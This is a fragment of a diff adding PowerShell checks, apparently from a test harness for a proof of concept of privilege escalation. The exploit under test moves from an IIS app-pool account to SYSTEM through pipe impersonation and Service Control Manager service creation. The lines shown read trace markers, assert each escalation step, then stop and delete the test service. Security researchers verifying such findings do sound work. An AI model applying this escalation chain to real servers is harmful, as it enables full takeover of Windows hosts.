+          sc.exe queryex $serviceName | Out-Host
+          sc.exe qc $serviceName | Out-Host
+          Get-WinEvent -FilterHashtable @{LogName='System'; ProviderName='Service Control Manager'; StartTime=$timerWaitStart} -ErrorAction SilentlyContinue |
+            Where-Object { $_.Message -match 'Pa30L105ApiProof' } |
+            Select-Object -First 8 TimeCreated,Id,Message | Format-List | Out-Host
+          Get-WinEvent -FilterHashtable @{LogName='Application'; StartTime=$timerWaitStart} -ErrorAction SilentlyContinue |
+            Where-Object { $_.Message -match 'Pa30ApiProbe|Pa30L105ApiProof' } |
+            Select-Object -First 8 TimeCreated,Id,ProviderName,Message | Format-List | Out-Host
+          $servicePersistent = $serviceBefore.State -eq 'Running' -and $serviceBefore.StartMode -eq 'Auto' -and $serviceBefore.StartName -eq 'LocalSystem' -and $serviceBefore.ProcessId -gt 0
+          Write-Host "WORKER_GONE_BEFORE_DELAYED_MARKER=$workerGone SERVICE_RUNNING_AFTER_WORKER_STOP=$servicePersistent SERVICE_START_MODE=$($serviceBefore.StartMode) SERVICE_ACCOUNT=$($serviceBefore.StartName) SERVICE_PID=$($serviceBefore.ProcessId)"
+          if (-not $workerGone -or -not $servicePersistent) { throw 'Service did not outlive monitor and worker' }
+          for ($i=0; $i -lt 90 -and (Get-Content $systemMarker -Raw) -eq 'PA30-system-baseline'; $i++) { Start-Sleep -Milliseconds 500 }
+          $serviceAfter = Get-CimInstance Win32_Service -Filter "Name='$serviceName'"
+          $serviceSurvived = $serviceAfter.State -eq 'Running' -and $serviceAfter.ProcessId -eq $serviceBefore.ProcessId
+          Write-Host "SERVICE_RUNNING_AFTER_DELAYED_WRITE=$serviceSurvived SERVICE_PID_AFTER=$($serviceAfter.ProcessId)"
+          if (-not $serviceSurvived) { throw 'Service did not remain running through delayed write' }
+          $finalTrace = Get-Content $attackTrace -Raw
+          for ($i=0; $i -lt 120 -and $finalTrace -notmatch 'SCM_EFFECT_COMPLETE=True' -and $finalTrace -notmatch 'ATTACK_EXCEPTION='; $i++) {
+            Start-Sleep -Milliseconds 500
+            $finalTrace = Get-Content $attackTrace -Raw
+          }
+          Write-Host "FINAL_ATTACK_TRACE=$($finalTrace.Replace("`r"," ").Replace("`n"," | "))"
+          $firstByteOk = $finalTrace -match 'FIRST_BYTE=68'
+          $impersonatedSidOk = $finalTrace -match 'IMPERSONATED_SID=S-1-5-18'
+          $levelOk = $finalTrace -match 'IMPERSONATION_LEVEL=Impersonation'
+          $protectedMatch = $finalTrace -match 'PROTECTED_MATCH=True'
+          $writeObserved = $finalTrace -match 'PROTECTED_WRITE=True'
+          $writeContent = if (Test-Path $child) { Get-Content $child -Raw } else { '' }
+          $writeMatch = $writeContent -eq 'PA30-inert-admin-write'
+          $directScmDenied = $finalTrace -match 'DIRECT_SCM_DENIED=True'
+          $lowerSystemDenied = $finalTrace -match 'DIRECT_SYSTEM_WRITE_DENIED=True'
+          $directSystemWritten = $finalTrace -match 'IMPERSONATED_SYSTEM_DIRECT_WRITE=True'
+          $directSystemContent = (Get-Content $systemDirect -Raw) -eq 'PA30-direct-system-write'
+          $scmOpened = $finalTrace -match 'IMPERSONATED_SCM_OPEN=True'
+          $serviceCreated = $finalTrace -match 'IMPERSONATED_SERVICE_CREATED=True'
+          $serviceStartAttempted = $finalTrace -match 'IMPERSONATED_SERVICE_START='
+          $systemContent = if (Test-Path $systemMarker) { Get-Content $systemMarker -Raw } else { '' }
+          $systemSidWritten = [bool]($systemContent -match 'S-1-5-18')
+          $probeLogPath = Join-Path $attack 'serviceprobe/probe.log'
+          $probeLog = if (Test-Path $probeLogPath) { Get-Content $probeLogPath -Raw } else { '' }
+          $probeSidSystem = [bool]($probeLog -match 'STARTED_SID=S-1-5-18') -and [bool]($probeLog -match 'SYSTEM_MARKER_WRITTEN_AFTER_DELAY=True')
+          $payloadPlaced = $finalTrace -match 'PAYLOAD_PLACED_AS_APPPOOL=True'
+          $controllerDllPlaced = $finalTrace -match 'SERVICE_CONTROLLER_PRESENT=True'
+          Write-Host "SERVICE_PROBE_LOG=$($probeLog.Replace("`r"," ").Replace("`n"," | "))"
+          Write-Host "SERVICE_PROBE_PLACED_BY_APPPOOL=$payloadPlaced SERVICE_PROBE_SYSTEM_SID=$probeSidSystem MARKER_BYTES=$(if (Test-Path $systemMarker) { (Get-Item $systemMarker).Length } else { -1 })"
+          sc.exe qc $serviceName | Out-Host
+          Get-CimInstance Win32_Service -Filter "Name='$serviceName'" | Select-Object Name,StartName,PathName,State,ProcessId | Format-List | Out-Host
+          sc.exe stop $serviceName | Out-Host
+          for ($i=0; $i -lt 30 -and (Get-CimInstance Win32_Service -Filter "Name='$serviceName'").State -ne 'Stopped'; $i++) { Start-Sleep -Milliseconds 500 }
+          $stopped = (Get-CimInstance Win32_Service -Filter "Name='$serviceName'").State -eq 'Stopped'
+          sc.exe delete $serviceName | Out-Host
+          Write-Host "SERVICE_STOPPED_CLEANLY=$stopped"
+          Write-Host "DIRECT_SCM_DENIED=$directScmDenied LOWER_SYSTEM_WRITE_DENIED=$lowerSystemDenied IMPERSONATED_SYSTEM_DIRECT_WRITE=$directSystemWritten DIRECT_SYSTEM_CONTENT=$directSystemContent IMPERSONATED_SCM_OPEN=$scmOpened IMPERSONATED_SERVICE_CREATED=$serviceCreated SERVICE_START_ATTEMPTED=$serviceStartAttempted SYSTEM_SID_WRITTEN=$systemSidWritten"
+          Write-Host "FAKE_INSTANCE_RECEIVED_CLIENT=$fakeReceived FIRST_BYTE_OK=$firstByteOk IMPERSONATED_ADMIN_SID=$impersonatedSidOk IMPERSONATION_LEVEL_OK=$levelOk PROTECTED_MATCH=$protectedMatch PROTECTED_WRITE=$writeObserved PROTECTED_WRITE_MATCH=$writeMatch WORKER_GONE_AFTER=$workerGone SERVICE_STOPPED_CLEANLY=$stopped"
+          if (-not $fakeReceived -or -not $firstByteOk -or -not $impersonatedSidOk -or -not $levelOk -or -not $protectedMatch -or -not $writeObserved -or -not $writeMatch -or -not $workerGone -or -not $servicePersistent -or -not $serviceSurvived -or -not $stopped) { throw 'Default IIS app-pool post-runtime privileged effect failed' }
+          Write-Host 'PA30_NET11_MONITOR_PERSISTENT_SERVICE_ADMIN_WRITE_ALL_ASSERTIONS_PASSED=True'
+          if (-not $directScmDenied -or -not $lowerSystemDenied -or -not $directSystemWritten -or -not $directSystemContent -or -not $payloadPlaced -or -not $controllerDllPlaced -or -not $scmOpened -or -not $serviceCreated -or -not $serviceStartAttempted -or -not $probeSidSystem -or -not $systemSidWritten) { throw 'SYSTEM direct and SCM service terminals not proved' }
+          if (-not $apiBaseline -or -not $unauthDenied -or -not $authTraceStarted) { throw 'Authenticated API causal controls failed' }
+          Write-Host 'PA30_L105_AUTHENTICATED_PID_TRACE_SYSTEM_PROTECTED_ACTION_PASSED=True'
